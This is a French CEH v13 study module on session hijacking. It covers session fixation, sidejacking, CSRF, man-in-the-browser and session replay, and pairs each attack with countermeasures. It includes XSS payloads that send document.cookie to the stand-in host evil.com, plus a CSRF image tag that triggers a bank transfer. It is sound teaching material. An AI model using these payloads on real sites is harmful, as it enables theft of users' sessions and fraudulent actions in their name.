# 🔴 Module 11 — Types et Mécanismes de Session Hijacking

> **CEH v13 | EC-Council**  
> `#SessionFixation` `#Sidejacking` `#CSRF` `#XSS` `#CookieTheft`

---

## 📌 Table des matières

1. [Session Fixation](#1-session-fixation)
2. [Session Hijacking via XSS](#2-xss-et-vol-de-cookie)
3. [Sidejacking](#3-sidejacking)
4. [CSRF — Cross-Site Request Forgery](#4-csrf)
5. [Man-in-the-Browser](#5-man-in-the-browser)
6. [Session Replay Attack](#6-session-replay)
7. [Comparatif des types](#7-comparatif)

---

## 1. Session Fixation

L'attaquant **force** la victime à utiliser un ID de session qu'il contrôle, au lieu d'en générer un aléatoirement.

```
ÉTAPES :
1. Attaquant demande un Session ID au serveur vulnérable
   Attaquant ──GET https://site.com/login──▶ Serveur
   Serveur ──Set-Cookie: sid=ATTACKER_CONTROLLED_ID──▶ Attaquant

2. Attaquant envoie ce lien à la victime
   https://site.com/login?sessid=ATTACKER_CONTROLLED_ID
   (ou via email de phishing)

3. Victime s'authentifie avec cet ID
   Victime ──POST /login + sessid=ATTACKER_CONTROLLED_ID──▶ Serveur
   Serveur NE RÉGÉNÈRE PAS l'ID → valide la session

4. Attaquant utilise le même ID
   Attaquant ──GET /dashboard + Cookie:sid=ATTACKER_CONTROLLED_ID──▶ Serveur
   Serveur croit que c'est la victime ✓
```

> ⚠️ **Rappel CEH** : La **contre-mesure principale** de la session fixation est la **régénération de l'ID de session après l'authentification** (`session_regenerate_id()` en PHP).

---

## 2. XSS et Vol de Cookie

XSS (Cross-Site Scripting) permet d'injecter du JavaScript malveillant qui vole le cookie de session.

### 2.1 XSS Réfléchi (Reflected)

```
URL malveillante :
https://vuln.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

Résultat côté victime :
- Navigateur exécute le script
- Envoie le cookie à evil.com
- Attaquant récupère : sid=abc123; auth_token=xyz
```

### 2.2 XSS Stocké (Stored)

```
Attaquant poste dans un forum :
<script>
  var img = new Image();
  img.src = 'https://evil.com/log?c=' + encodeURIComponent(document.cookie);
</script>

→ Chaque visiteur de la page exécute ce script
→ Tous leurs cookies sont envoyés à evil.com
```

### 2.3 Pourquoi HttpOnly protège

```
Sans HttpOnly :
  document.cookie → "sid=abc123; user=alice"  ✓ JavaScript peut lire

Avec HttpOnly :
  document.cookie → ""  ✗ JavaScript NE PEUT PAS lire les cookies HttpOnly
```

---

## 3. Sidejacking

Le **sidejacking** exploite le fait que certains sites utilisent HTTPS pour le login mais HTTP pour la navigation, envoyant le cookie de session en clair.

```
Réseau Wi-Fi public (café, aéroport) :

Alice ──GET http://site.com/dashboard + Cookie: sid=abc──▶ Routeur──▶ Serveur
         [En clair sur le réseau !]
                    ↑
              [Attaquant capture
               les paquets avec
               Wireshark/Hamster]
               
Attaquant ──GET http://site.com/dashboard + Cookie: sid=abc──▶ Serveur
```

**Outils historiques :** Firesheep (Firefox add-on, 2010), Hamster + Ferret

> ⚠️ **Rappel CEH** : Le sidejacking n'est possible que si le cookie est transmis **sans le flag `Secure`** — il sera envoyé sur HTTP en clair.

---

## 4. CSRF — Cross-Site Request Forgery

CSRF force le navigateur de la victime à effectuer une requête non voulue vers un site où elle est authentifiée.

```
Scénario bancaire :

1. Alice est connectée sur bank.com (cookie sid=alice_session)

2. Alice visite une page malveillante (pub, email, forum) :
   <img src="https://bank.com/transfer?to=attacker&amount=1000">
   
3. Le navigateur d'Alice envoie automatiquement :
   GET https://bank.com/transfer?to=attacker&amount=1000
   Cookie: sid=alice_session  ← Envoyé automatiquement !
   
4. bank.com croit que c'est Alice qui fait le transfert ✓
```

### CSRF vs XSS

| Critère | CSRF | XSS |
|---------|------|-----|
| **Mécanisme** | Forge des requêtes | Exécute du code JS |
| **Nécessite** | Victime authentifiée | Vulnérabilité injection |
| **Cible** | Serveur (actions) | Client (données) |
| **Protection** | Token CSRF + SameSite | HttpOnly + CSP |

---

## 5. Man-in-the-Browser (MitB)

Un **malware** (trojan) s'intègre dans le navigateur pour intercepter et modifier les transactions en temps réel.

```
Infection → Malware dans browser
                    │
   Victime tape : "Transférer 100€ à Bob"
                    │
   Malware modifie → "Transférer 1000€ à Attacker" (invisible pour victime)
                    │
   Serveur reçoit la requête modifiée avec session valide
```

**Outils :** Zeus, SpyEye, Dridex

---

## 6. Session Replay Attack

L'attaquant **capture et réutilise** un token d'authentification valide même après avoir été envoyé une fois.

```
1. Attaquant intercepte : Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
2. Token capturé, même expiré
3. Si pas de mécanisme anti-replay : réutilisation possible

Protection : 
- Nonce (valeur unique par requête)
- Timestamp validation
- Token à usage unique (OTP)
```

---

## 7. Comparatif des types

| Type | Vecteur | Condition requise | Difficulté |
|------|---------|------------------|------------|
| **Session Fixation** | URL / Cookie préfixé | Serveur ne régénère pas l'ID | Faible |
| **XSS + Cookie Theft** | Injection JavaScript | Vulnérabilité XSS présente | Moyenne |
| **Sidejacking** | Sniffing réseau | Réseau partagé + HTTP | Faible (réseau local) |
| **CSRF** | Lien / Image malveillante | Victime authentifiée | Faible |
| **MitB** | Malware navigateur | Infection du poste | Élevée |
| **Session Replay** | Interception token | Pas de mécanisme anti-replay | Faible |
| **TCP Hijacking** | Injection paquets TCP | Accès réseau + prédiction SEQ | Très élevée |

---

## 🧠 Points clés à retenir pour l'examen

- **Session fixation** = l'attaquant *impose* l'ID ; **session hijacking** = l'attaquant *vole* l'ID
- XSS + HttpOnly = le vol de cookie via JavaScript est impossible
- Sidejacking = sniffing de cookie HTTP (non chiffré) sur réseau partagé
- CSRF contourné par les **tokens CSRF** et l'attribut **SameSite=Strict**
- MitB = malware browser → difficile à détecter car côté client

---

*⬅️ [Concepts fondamentaux](./01_concepts_fondamentaux.md) | ➡️ [Techniques avancées](./03_techniques_avancees.md)*
